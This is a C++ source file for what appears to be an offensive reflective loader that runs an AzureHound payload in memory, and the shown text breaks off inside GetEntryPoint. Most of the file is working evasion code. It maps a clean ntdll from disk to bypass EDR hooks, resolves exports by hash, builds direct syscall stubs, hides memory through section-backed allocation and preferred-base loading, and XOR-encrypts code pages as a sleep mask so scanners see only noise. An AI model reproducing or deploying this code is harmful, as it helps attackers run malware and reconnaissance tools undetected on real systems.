// ============================================================================
// AzureHound Reflective Loader - FreshyCalls + Direct Syscalls + Sleep Mask (Go payloads)
// ============================================================================
// Go runtime is incompatible with on-demand VEH page decryption (Go uses its own
// VEH for goroutine stack guard pages).  Instead we encrypt all code pages during
// init, then bulk-decrypt them to RX immediately before calling the entry point.
// This creates a brief "scan window" where dynamic scanners see encrypted noise.
// VEH is not used — all pages are decrypted before execution starts.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <cstdint>
#include <cstring>
#include <stdexcept>
#include <cstdio>
// (OpenSSL + Zstd removed — XOR only, no compression)

// ----------------------------------------------------------------------------
// Debug output – comment out for release
// ----------------------------------------------------------------------------
#define DEBUG
#ifdef DEBUG
    #define DbgPrint(...) printf(__VA_ARGS__)
#else
    #define DbgPrint(...) ((void)0)
#endif

// ----------------------------------------------------------------------------
// Blob header
// ----------------------------------------------------------------------------
struct BlobHeader { char magic[4]; uint16_t version; uint8_t flags; uint8_t reserved[3]; };
#define BLOB_VERSION 1

// ----------------------------------------------------------------------------
// NTSTATUS definition (if not already defined)
// ----------------------------------------------------------------------------
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// ----------------------------------------------------------------------------
// NtClose / ViewUnmap declarations (needed for SysAllocBacked)
// ----------------------------------------------------------------------------
extern "C" NTSTATUS NTAPI NtClose(HANDLE Handle);
#ifndef ViewUnmap
#define ViewUnmap 2
#endif

// ----------------------------------------------------------------------------
// FreshyCalls — syscall extraction from disk-mapped ntdll (unhooked copy)
// ----------------------------------------------------------------------------
// EDRs hook the in-memory ntdll.dll.  We bypass that by reading a clean copy
// straight from C:\Windows\System32\ntdll.dll on disk.  No GetModuleHandle,
// no GetProcAddress — we walk the PE export table ourselves on the clean copy.
// ----------------------------------------------------------------------------

static uint32_t HashString(const char* str) {
    uint32_t hash = 0x811c9dc5;
    while (*str) {
        hash ^= (uint8_t)*str++;
        hash *= 0x01000193;
    }
    return hash;
}

// ---------------------------------------------------------------------------
// Map a clean copy of ntdll.dll from disk — returns base address + file size
// ---------------------------------------------------------------------------
static uint8_t* MapNtdllFromDisk(SIZE_T& outSize) {
    const wchar_t* path = L"C:\\Windows\\System32\\ntdll.dll";

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return nullptr;

    DWORD fileSize = GetFileSize(hFile, nullptr);
    if (fileSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return nullptr; }

    HANDLE hMapping = CreateFileMappingW(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    CloseHandle(hFile);
    if (!hMapping) return nullptr;

    uint8_t* base = (uint8_t*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMapping);
    if (!base) return nullptr;

    outSize = fileSize;
    return base;
}

// ---------------------------------------------------------------------------
// Walk the export table of the clean ntdll copy, find a function by FNV-1a hash
// Returns its RVA (offset from the base of the mapped copy).
// ---------------------------------------------------------------------------
static DWORD FindExportRva(uint8_t* base, uint32_t hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    IMAGE_DATA_DIRECTORY expDir =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir.Size) return 0;

    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(base + expDir.VirtualAddress);
    DWORD* names   = (DWORD*)(base + pExp->AddressOfNames);
    WORD*  ords    = (WORD*)(base + pExp->AddressOfNameOrdinals);
    DWORD* funcs   = (DWORD*)(base + pExp->AddressOfFunctions);

    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char* name = (const char*)base + names[i];
        if (HashString(name) == hash)
            return funcs[ords[i]];  // RVA
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Extract the syscall number from a function's bytes in the clean ntdll copy.
// Pattern: scan for `syscall` (0F 05) then walk backward to find
// `mov eax, imm32` (B8 xx xx xx xx).
// ---------------------------------------------------------------------------
static uint32_t ExtractSSN(uint8_t* base, DWORD rva) {
    uint8_t* p = base + rva;
    // Scan forward for syscall; ret (0F 05 C3) or just syscall (0F 05)
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0x0F && p[i+1] == 0x05) {
            // Walk backward to find mov eax, imm32 (0xB8)
            for (int j = i - 1; j >= i - 16 && j >= 0; j--) {
                if (p[j] == 0xB8) {
                    uint32_t ssn = *(uint32_t*)(p + j + 1);
                    // Sanity: syscall numbers are < 0x200 on all Windows builds
                    if (ssn > 0 && ssn < 0x200) return ssn;
                }
            }
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Syscall function types, global pointers + stub infrastructure
// ---------------------------------------------------------------------------
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemoryFunc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemoryFunc)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemoryFunc)(HANDLE, PVOID, const void*, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtCreateSectionFunc)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* NtMapViewOfSectionFunc)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

static NtAllocateVirtualMemoryFunc pNtAlloc = nullptr;
static NtProtectVirtualMemoryFunc  pNtProt  = nullptr;
static NtWriteVirtualMemoryFunc    pNtWrite = nullptr;
static NtCreateSectionFunc         pNtCreateSection = nullptr;
static NtMapViewOfSectionFunc      pNtMapViewOfSection = nullptr;

// Shared stub page — all 5 trampolines fit in one 4KB page
static void* g_stubPage = nullptr;
static size_t g_stubOffset = 0;

static void* CreateSyscallStub(uint32_t ssn) {
    uint8_t trampoline[] = {
        0x4C, 0x8B, 0xD1,                   // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,       // mov eax, SSN
        0x0F, 0x05,                          // syscall
        0xC3                                 // ret
    };
    *(uint32_t*)(trampoline + 4) = ssn;

    if (!g_stubPage) {
        g_stubPage = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!g_stubPage) return nullptr;
    }
    void* stubAddr = (uint8_t*)g_stubPage + g_stubOffset;
    memcpy(stubAddr, trampoline, sizeof(trampoline));
    g_stubOffset += sizeof(trampoline);
    return stubAddr;
}

static void FinalizeStubs() {
    if (g_stubPage) {
        DWORD old;
        VirtualProtect(g_stubPage, 0x1000, PAGE_EXECUTE_READ, &old);
    }
}

// ---------------------------------------------------------------------------
// Initialize syscalls using FreshyCalls
// ---------------------------------------------------------------------------
static bool InitSyscalls() {
    // Map clean ntdll from disk (bypasses in-memory EDR hooks)
    SIZE_T ntdllSize = 0;
    uint8_t* cleanNtdll = MapNtdllFromDisk(ntdllSize);
    if (!cleanNtdll) {
        DbgPrint("[!] FreshyCalls: could not map ntdll from disk\n");
        return false;
    }
    DbgPrint("[*] FreshyCalls: mapped clean ntdll, size=%zu\n", ntdllSize);

    // Look up exports by hash in the clean copy
    static const uint32_t hAlloc  = HashString("NtAllocateVirtualMemory");
    static const uint32_t hProt   = HashString("NtProtectVirtualMemory");
    static const uint32_t hWrite  = HashString("NtWriteVirtualMemory");
    static const uint32_t hCreate = HashString("NtCreateSection");
    static const uint32_t hMap    = HashString("NtMapViewOfSection");

    DWORD rvaAlloc  = FindExportRva(cleanNtdll, hAlloc);
    DWORD rvaProt   = FindExportRva(cleanNtdll, hProt);
    DWORD rvaWrite  = FindExportRva(cleanNtdll, hWrite);
    DWORD rvaCreate = FindExportRva(cleanNtdll, hCreate);
    DWORD rvaMap    = FindExportRva(cleanNtdll, hMap);

    if (!rvaAlloc || !rvaProt || !rvaWrite || !rvaCreate || !rvaMap) {
        DbgPrint("[!] FreshyCalls: failed to find exports in clean ntdll\n");
        UnmapViewOfFile(cleanNtdll);
        return false;
    }

    // Extract clean SSNs
    uint32_t ssnAlloc  = ExtractSSN(cleanNtdll, rvaAlloc);
    uint32_t ssnProt   = ExtractSSN(cleanNtdll, rvaProt);
    uint32_t ssnWrite  = ExtractSSN(cleanNtdll, rvaWrite);
    uint32_t ssnCreate = ExtractSSN(cleanNtdll, rvaCreate);
    uint32_t ssnMap    = ExtractSSN(cleanNtdll, rvaMap);

    // Done with the clean copy
    UnmapViewOfFile(cleanNtdll);

    DbgPrint("[*] ssnAlloc=0x%X ssnProt=0x%X ssnWrite=0x%X ssnCreate=0x%X ssnMap=0x%X\n",
             ssnAlloc, ssnProt, ssnWrite, ssnCreate, ssnMap);

    if (!ssnAlloc || !ssnProt || !ssnWrite || !ssnCreate || !ssnMap) {
        DbgPrint("[!] FreshyCalls: failed to extract SSNs\n");
        return false;
    }

    DbgPrint("[+] FreshyCalls: SSNs extracted from clean disk copy\n");

    pNtAlloc = (NtAllocateVirtualMemoryFunc)CreateSyscallStub(ssnAlloc);
    pNtProt  = (NtProtectVirtualMemoryFunc)CreateSyscallStub(ssnProt);
    pNtWrite = (NtWriteVirtualMemoryFunc)CreateSyscallStub(ssnWrite);
    pNtCreateSection = (NtCreateSectionFunc)CreateSyscallStub(ssnCreate);
    pNtMapViewOfSection = (NtMapViewOfSectionFunc)CreateSyscallStub(ssnMap);

    DbgPrint("[*] pNtAlloc=%p, pNtProt=%p, pNtWrite=%p\n", pNtAlloc, pNtProt, pNtWrite);
    DbgPrint("[*] pNtCreateSection=%p, pNtMapViewOfSection=%p\n", pNtCreateSection, pNtMapViewOfSection);

    if (!pNtAlloc || !pNtProt || !pNtWrite || !pNtCreateSection || !pNtMapViewOfSection) {
        DbgPrint("[!] Failed to create syscall stubs\n");
        return false;
    }

    FinalizeStubs();  // Flip shared page RW → RX (never RWX)
    DbgPrint("[+] Syscall stubs created (shared page, no RWX)\n");

    DbgPrint("[+] Syscall stubs created: Alloc=%p, Prot=%p, Write=%p, CreateSection=%p, MapViewOfSection=%p\n",
             pNtAlloc, pNtProt, pNtWrite, pNtCreateSection, pNtMapViewOfSection);
    return true;
}

// ----------------------------------------------------------------------------
// Memory helpers (prefer syscalls, fallback to Win32)
// Direct syscall wrappers (fallback to Win32 if syscalls unavailable)
// ----------------------------------------------------------------------------
static void* SysAlloc(SIZE_T size) {
    if (pNtAlloc) {
        PVOID base = nullptr;
        SIZE_T sz = size;
        if (NT_SUCCESS(pNtAlloc(GetCurrentProcess(), &base, 0, &sz,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
            return base;
    }
    return VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

static bool SysProtect(void* addr, SIZE_T size, DWORD prot) {
    if (pNtProt) {
        SIZE_T sz = size;
        ULONG old = 0;
        if (NT_SUCCESS(pNtProt(GetCurrentProcess(), &addr, &sz, prot, &old)))
            return true;
    }
    DWORD old;
    return VirtualProtect(addr, size, prot, &old);
}

static bool SysWrite(void* dst, const void* src, SIZE_T size) {
    if (pNtWrite) {
        ULONG written = 0;
        if (NT_SUCCESS(pNtWrite(GetCurrentProcess(), dst, src, (ULONG)size, &written)))
            return true;
    }
    DWORD old;
    if (!VirtualProtect(dst, size, PAGE_READWRITE, &old)) return false;
    memcpy(dst, src, size);
    VirtualProtect(dst, size, old, &old);
    return true;
}


// ----------------------------------------------------------------------------
// Global mapped base
// ----------------------------------------------------------------------------
static void* g_mappedBase = nullptr;

// ----------------------------------------------------------------------------
// Allocate memory via NtCreateSection + NtMapViewOfSection (section-backed, not unbacked)
// Falls back to VirtualAlloc if section syscalls fail.
// ----------------------------------------------------------------------------
static void* SysAllocBacked(SIZE_T size) {
    DbgPrint("[*] SysAllocBacked: size=%zu\n", size);

    // Try section-backed allocation first (memory appears as mapped, not private/unbacked)
    if (pNtCreateSection && pNtMapViewOfSection) {
        LARGE_INTEGER maxSize;
        maxSize.QuadPart = size;
        HANDLE hSection = nullptr;

        NTSTATUS status = pNtCreateSection(&hSection,
                                           SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
                                           nullptr, &maxSize,
                                           PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
        if (NT_SUCCESS(status)) {
            PVOID base = nullptr;
            SIZE_T viewSize = size;
            status = pNtMapViewOfSection(hSection, (HANDLE)-1, &base,
                                         0, 0, nullptr, &viewSize,
                                         ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
            NtClose(hSection);
            if (NT_SUCCESS(status)) {
                DbgPrint("[*] SysAllocBacked: section-backed base=%p\n", base);
                return base;
            }
            DbgPrint("[!] SysAllocBacked: NtMapViewOfSection failed (0x%08lX)\n", (unsigned long)status);
        } else {
            DbgPrint("[!] SysAllocBacked: NtCreateSection failed (0x%08X)\n", status);
        }
    }

    // Fallback to VirtualAlloc
    void* p = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DbgPrint("[*] SysAllocBacked: VirtualAlloc fallback, base=%p\n", p);
    return p;
}

// ----------------------------------------------------------------------------
// Image protection (toggling RW / RX for whole image)
// ----------------------------------------------------------------------------
static bool SetImageProtection(DWORD prot) {
    if (!g_mappedBase) return false;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD size = nt->OptionalHeader.SizeOfImage;
    const char* protName = (prot == PAGE_READWRITE) ? "RW" :
                           (prot == PAGE_EXECUTE_READ) ? "RX" : "other";
    bool ok = SysProtect(base, size, prot);  // direct call
    if (ok) DbgPrint("[+] Image protection set to %s\n", protName);
    else DbgPrint("[!] Failed to set protection to %s\n", protName);
    return ok;
}

// ----------------------------------------------------------------------------
// PE mapping
// ----------------------------------------------------------------------------
static bool MapPE(const uint8_t* data, SIZE_T len) {
    DbgPrint("[*] MapPE: parsing headers...\n");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { DbgPrint("[!] Invalid DOS header\n"); return false; }
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { DbgPrint("[!] Invalid NT header\n"); return false; }
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) { DbgPrint("[!] Not x64 PE\n"); return false; }

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    ULONGLONG prefBase = nt->OptionalHeader.ImageBase;
    DbgPrint("[*] Image size: 0x%X, preferred base: 0x%llX\n", imageSize, prefBase);

    // Try preferred base first (reduces peIntegrity detections)
    void* base = nullptr;
    if (prefBase && prefBase < 0x00007FFFFFFFFFFFULL) {
        if (pNtAlloc) {
            PVOID addr = (PVOID)(ULONG_PTR)prefBase;
            SIZE_T sz = imageSize;
            if (!NT_SUCCESS(pNtAlloc((HANDLE)-1, &addr, 0, &sz,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) || addr != (PVOID)(ULONG_PTR)prefBase) {
                addr = nullptr;
            }
            base = addr;
        }
        if (!base) {
            base = VirtualAlloc((PVOID)(ULONG_PTR)prefBase, imageSize,
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (base != (PVOID)(ULONG_PTR)prefBase) {
                if (base) VirtualFree(base, 0, MEM_RELEASE);
                base = nullptr;
            }
        }
        if (base) DbgPrint("[*] Allocated at preferred base: %p\n", base);
    }

    // Fall back to section-backed anywhere
    if (!base) {
        base = SysAllocBacked(imageSize);
    }
    if (!base) { DbgPrint("[!] Allocation failed\n"); return false; }
    g_mappedBase = base;
    DbgPrint("[+] Mapped base: %p\n", base);

    memcpy(base, data, nt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sect[i].Misc.VirtualSize && sect[i].PointerToRawData && sect[i].SizeOfRawData) {
            if (!SysWrite((BYTE*)base + sect[i].VirtualAddress,
                           data + sect[i].PointerToRawData,
                           sect[i].SizeOfRawData)) {  // direct call
                DbgPrint("[!] Failed to write section %d\n", i);
            }
        }
    }
    DbgPrint("[*] PE sections copied\n");

    // Initially set to RX (no RWX)
    if (!SetImageProtection(PAGE_EXECUTE_READ)) return false;
    DbgPrint("[+] MapPE: success\n");
    return true;
}

// ----------------------------------------------------------------------------
// Apply relocations (temporarily makes image writable)
// ----------------------------------------------------------------------------
static bool ApplyRelocations() {
    DbgPrint("[*] ApplyRelocations: start\n");
    if (!g_mappedBase) return false;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (!rva) { DbgPrint("[*] No relocations present\n"); return true; }
    ULONGLONG delta = (ULONGLONG)base - nt->OptionalHeader.ImageBase;
    if (!delta) { DbgPrint("[*] No delta (loaded at preferred base)\n"); return true; }
    DbgPrint("[*] Delta: 0x%llX\n", delta);

    if (!SetImageProtection(PAGE_READWRITE)) {
        DbgPrint("[!] Failed to make image writable for relocations\n");
        return false;
    }

    PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(base + rva);
    while (rel->VirtualAddress) {
        DWORD count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* items = (WORD*)(rel + 1);
        for (DWORD i = 0; i < count; i++) {
            if ((items[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                ULONGLONG* addr = (ULONGLONG*)(base + rel->VirtualAddress + (items[i] & 0xFFF));
                *addr += delta;
            }
        }
        rel = (PIMAGE_BASE_RELOCATION)((BYTE*)rel + rel->SizeOfBlock);
    }

    if (!SetImageProtection(PAGE_EXECUTE_READ)) {
        DbgPrint("[!] Failed to restore RX after relocations\n");
        return false;
    }
    DbgPrint("[+] Relocations applied\n");
    return true;
}

// ----------------------------------------------------------------------------
// Resolve imports (temporarily makes image writable)
// ----------------------------------------------------------------------------
static bool ResolveImports() {
    DbgPrint("[*] ResolveImports: start\n");
    if (!g_mappedBase) return false;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (!rva) { DbgPrint("[*] No imports\n"); return true; }

    if (!SetImageProtection(PAGE_READWRITE)) {
        DbgPrint("[!] Failed to make image writable for imports\n");
        return false;
    }

    PIMAGE_IMPORT_DESCRIPTOR desc = (PIMAGE_IMPORT_DESCRIPTOR)(base + rva);
    while (desc->Name) {
        const char* dll = (const char*)(base + desc->Name);
        DbgPrint("[*] Loading DLL: %s\n", dll);
        HMODULE h = LoadLibraryA(dll);
        if (h) {
            PIMAGE_THUNK_DATA orig = (PIMAGE_THUNK_DATA)(base + (desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk));
            PIMAGE_THUNK_DATA iat  = (PIMAGE_THUNK_DATA)(base + desc->FirstThunk);
            int count = 0;
            while (orig->u1.Ordinal) {
                FARPROC func = nullptr;
                if (!(orig->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                    PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(base + orig->u1.Ordinal);
                    func = GetProcAddress(h, name->Name);
                } else {
                    func = GetProcAddress(h, (LPCSTR)(orig->u1.Ordinal & ~IMAGE_ORDINAL_FLAG));
                }
                iat->u1.Function = (ULONGLONG)func;
                orig++; iat++;
                count++;
            }
            DbgPrint("[+] Resolved %d functions from %s\n", count, dll);
        } else {
            DbgPrint("[!] Failed to load %s\n", dll);
        }
        desc++;
    }

    if (!SetImageProtection(PAGE_EXECUTE_READ)) {
        DbgPrint("[!] Failed to restore RX after imports\n");
        return false;
    }
    DbgPrint("[+] Imports resolved\n");
    return true;
}

// ----------------------------------------------------------------------------
// TLS callbacks (if present)
// ----------------------------------------------------------------------------
static bool InitTLS() {
    DbgPrint("[*] InitTLS: start\n");
    if (!g_mappedBase) return false;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (!rva) { DbgPrint("[*] No TLS directory\n"); return true; }
    PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)(base + rva);
    DWORD imgSize = nt->OptionalHeader.SizeOfImage;
    if (tls->AddressOfCallBacks == 0 || tls->AddressOfCallBacks >= imgSize) {
        DbgPrint("[*] TLS callbacks invalid, skipping\n");
        return true;
    }
    PIMAGE_TLS_CALLBACK* cb = (PIMAGE_TLS_CALLBACK*)(base + tls->AddressOfCallBacks);
    while (*cb) {
        DbgPrint("[*] Executing TLS callback at %p\n", *cb);
        (*cb)((PVOID)GetModuleHandle(NULL), DLL_PROCESS_ATTACH, NULL);
        cb++;
    }
    DbgPrint("[+] TLS callbacks executed\n");
    return true;
}

// ----------------------------------------------------------------------------
// Apply per-section permissions (stealthy)
// ----------------------------------------------------------------------------
static bool ApplySectionProtections() {
    if (!g_mappedBase) return false;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);

    DbgPrint("[*] Applying per-section protections...\n");
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD addr = sect[i].VirtualAddress;
        DWORD size = sect[i].Misc.VirtualSize;
        if (size == 0) continue;

        DWORD prot = 0;
        DWORD charFlags = sect[i].Characteristics;

        if (charFlags & IMAGE_SCN_MEM_EXECUTE) {
            prot = PAGE_EXECUTE_READ;
        } else {
            prot = PAGE_READONLY;
        }

        if (charFlags & IMAGE_SCN_MEM_WRITE) {
            if (prot & PAGE_EXECUTE_READ) prot = PAGE_EXECUTE_READWRITE;
            else prot = PAGE_READWRITE;
        }

        if (!SysProtect(base + addr, size, prot)) {
            DbgPrint("[!] Failed to protect section %d (VA=0x%X) with 0x%X\n", i, addr, prot);
            return false;
        }
        DbgPrint("[*] Section %d: VA=0x%X, size=0x%X, flags=0x%X -> prot=0x%X\n",
                 i, addr, size, charFlags, prot);
    }
    DbgPrint("[+] Per-section protections applied\n");
    return true;
}

// ============================================================================
// Sleep Mask — VEH + Timer (on-demand per-page decrypt, auto re-encrypt)
// ============================================================================
static uint8_t    g_smKey[64];
static LONG*      g_smTrack = nullptr;
static DWORD      g_smPages = 0;
static volatile LONG g_smLock = 0;
static HANDLE     g_smTimer = nullptr;
static volatile bool g_smStop = false;
static void*      g_smVeh = nullptr;
#define SM_ENCRYPTED 0
#define SM_DECRYPTED 1
#define SM_SKIP      2

__attribute__((noinline)) static void SmXorPage(void* page) {
    uint8_t* p = (uint8_t*)page;
    for (int i = 0; i < 4096; i++) p[i] ^= g_smKey[i & 63];
}

__attribute__((noinline)) static DWORD WINAPI SmTimerProc(void*) {
    while (!g_smStop) {
        Sleep(5000);  // 5s interval — safer, reduces race window
        if (g_smStop) break;
        while (InterlockedExchange(&g_smLock, 1)) Sleep(0);
        for (DWORD i = 0; i < g_smPages && !g_smStop; i++) {
            if (g_smTrack[i] != SM_DECRYPTED) continue;
            void* page = (uint8_t*)g_mappedBase + (i * 4096);
            VirtualProtect(page, 4096, PAGE_NOACCESS, nullptr);
            { PVOID a = page; SIZE_T s = 4096; ULONG o;
              pNtProt((HANDLE)-1, &a, &s, PAGE_READWRITE, &o); }
            SmXorPage(page);
            { PVOID a = page; SIZE_T s = 4096; ULONG o;
              pNtProt((HANDLE)-1, &a, &s, PAGE_NOACCESS, &o); }
            g_smTrack[i] = SM_ENCRYPTED;
        }
        InterlockedExchange(&g_smLock, 0);
    }
    return 0;
}

static __thread bool g_smInVeh = false;

static LONG CALLBACK SmVehHandler(PEXCEPTION_POINTERS ex) {
    if (g_smInVeh) return EXCEPTION_CONTINUE_SEARCH;
    DWORD code = ex->ExceptionRecord->ExceptionCode;
    ULONG_PTR fa = ex->ExceptionRecord->ExceptionInformation[1];
    ULONG_PTR accessType = ex->ExceptionRecord->ExceptionInformation[0];
    if (code != EXCEPTION_ACCESS_VIOLATION) return EXCEPTION_CONTINUE_SEARCH;
    // Handle read (0), write (1), and execute (8) — encrypted pages can't be touched at all
    ULONG_PTR ba = (ULONG_PTR)g_mappedBase;
    if (!g_mappedBase || fa < ba || fa >= ba + (SIZE_T)g_smPages * 4096)
        return EXCEPTION_CONTINUE_SEARCH;
    DWORD pi = (DWORD)((fa - ba) / 4096);
    if (g_smTrack[pi] != SM_ENCRYPTED) return EXCEPTION_CONTINUE_SEARCH;

    g_smInVeh = true;
    while (InterlockedExchange(&g_smLock, 1)) { /* spin */ }
    void* page = (void*)(ba + (ULONG_PTR)pi * 4096);
    { PVOID a = page; SIZE_T s = 4096; ULONG o;
      pNtProt((HANDLE)-1, &a, &s, PAGE_READWRITE, &o); }
    SmXorPage(page);
    { PVOID a = page; SIZE_T s = 4096; ULONG o;
      pNtProt((HANDLE)-1, &a, &s, PAGE_EXECUTE_READ, &o); }
    g_smTrack[pi] = SM_DECRYPTED;
    InterlockedExchange(&g_smLock, 0);
    g_smInVeh = false;
    return EXCEPTION_CONTINUE_EXECUTION;
}

__attribute__((noinline)) static void SleepMaskInit() {
    if (!g_mappedBase) return;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD imgSize = nt->OptionalHeader.SizeOfImage;
    g_smPages = (imgSize + 4095) / 4096;
    for (int i = 0; i < 64; i++) g_smKey[i] = (uint8_t)(GetTickCount() ^ (i * 0x9D));
    g_smTrack = (LONG*)VirtualAlloc(nullptr, g_smPages * 4, MEM_COMMIT, PAGE_READWRITE);
    if (!g_smTrack) return;
    for (DWORD i = 0; i < g_smPages; i++) g_smTrack[i] = SM_SKIP;
    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!(sect[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        if (!sect[i].Misc.VirtualSize) continue;
        DWORD ps = sect[i].VirtualAddress / 4096;
        DWORD pe = (sect[i].VirtualAddress + sect[i].Misc.VirtualSize + 4095) / 4096;
        for (DWORD pi = ps; pi < pe && pi < g_smPages; pi++) {
            void* page = base + (pi * 4096);
            { PVOID a = page; SIZE_T s = 4096; ULONG o;
              pNtProt((HANDLE)-1, &a, &s, PAGE_READWRITE, &o); }
            SmXorPage(page);
            { PVOID a = page; SIZE_T s = 4096; ULONG o;
              pNtProt((HANDLE)-1, &a, &s, PAGE_NOACCESS, &o); }
            g_smTrack[pi] = SM_ENCRYPTED;
        }
    }
    DbgPrint("[+] SleepMask: %lu pages encrypted\n", g_smPages);
}

// Go-compatible: bulk-decrypt ALL encrypted pages before EP call (no VEH, no timer)
static void SleepMaskStart() {
    if (!g_mappedBase || !g_smTrack) return;
    BYTE* base = (BYTE*)g_mappedBase;
    DbgPrint("[*] SleepMask: bulk-decrypting all pages...\n");
    for (DWORD i = 0; i < g_smPages; i++) {
        if (g_smTrack[i] != SM_ENCRYPTED) continue;
        void* page = base + (i * 4096);
        { PVOID a = page; SIZE_T s = 4096; ULONG o;
          pNtProt((HANDLE)-1, &a, &s, PAGE_READWRITE, &o); }
        SmXorPage(page);
        { PVOID a = page; SIZE_T s = 4096; ULONG o;
          pNtProt((HANDLE)-1, &a, &s, PAGE_EXECUTE_READ, &o); }
        g_smTrack[i] = SM_DECRYPTED;
    }
    DbgPrint("[+] SleepMask: all pages decrypted for Go payload\n");
}

static void SleepMaskStop() {
    if (g_smTrack) { VirtualFree(g_smTrack, 0, MEM_RELEASE); g_smTrack = nullptr; }
}

// ----------------------------------------------------------------------------
// Get entry point address
// ----------------------------------------------------------------------------
static void* GetEntryPoint() {
    if (!g_mappedBase) return nullptr;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
